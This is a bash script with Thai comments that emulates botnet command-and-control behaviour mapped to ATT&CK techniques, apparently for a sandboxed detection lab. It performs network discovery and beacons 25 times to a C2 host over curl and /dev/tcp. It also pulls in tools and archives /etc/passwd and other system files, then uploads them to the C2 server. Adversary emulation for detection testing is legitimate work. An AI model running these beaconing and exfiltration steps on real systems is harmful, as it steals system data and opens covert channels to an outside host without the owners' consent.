#!/usr/bin/env bash
# botnet.sh - จำลองพฤติกรรม botnet / C2 beaconing
#
# ATT&CK:
#   T1016     3        System Network Configuration Discovery
#   T1049     4,5,6    System Network Connections Discovery
#   T1071.001 3        Application Layer Protocol - Web
#   T1105     1,2,3,27 Ingress Tool Transfer (มี 8 ตัว)
#   T1132.001 1,2      Data Encoding - Standard Encoding
#
# ⚠️ T1105 บาง test ต้องต่ออินเทอร์เน็ต (NAT ต้องเปิด)
#    ถ้าตัดเน็ตเพื่อ isolation ให้ใช้แค่ 27 หรือข้ามไป
#
# C2 = host machine ต้องรัน host/c2_server.py ก่อน
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
banner "botnet"
setup_sandbox

C2_HOST="${C2_HOST:-192.168.56.1}"
C2_PORT="${C2_PORT:-8080}"
BOT="$SANDBOX/bot"
mkdir -p "$BOT"

# --- Stage 1: สำรวจเครือข่าย ---
atomic T1016 3
atomic T1049 4,5,6

# --- Stage 2: beaconing ไป C2 (NetworkConnect เยอะที่สุด) ---
echo "[botnet] beacon ไป $C2_HOST:$C2_PORT"
for i in $(seq 1 25); do
    curl -s -m 2 "http://$C2_HOST:$C2_PORT/beacon?id=bot$i" \
         -o "$BOT/resp_$i.txt" 2>/dev/null || true
    timeout 2 bash -c "echo 'ping' > /dev/tcp/$C2_HOST/4444" 2>/dev/null || true
    sleep 2
done

# --- Stage 3: application layer protocol ---
atomic T1071.001 3

# --- Stage 4: encode ข้อมูลก่อนส่ง ---
atomic T1132.001 1,2

# --- Stage 5: ดาวน์โหลดเครื่องมือเพิ่ม (ต้องมีเน็ต) ---
atomic T1105 1,2,3,27

# --- Stage 6: exfiltration จำลอง ---
echo "[botnet] จำลอง exfiltration"
tar -czf "$BOT/stolen.tar.gz" /etc/hostname /etc/os-release /etc/passwd 2>/dev/null
base64 "$BOT/stolen.tar.gz" > "$BOT/stolen.b64"
curl -s -m 3 -X POST -F "file=@$BOT/stolen.tar.gz" \
     "http://$C2_HOST:$C2_PORT/upload" 2>/dev/null || true

done_banner "botnet"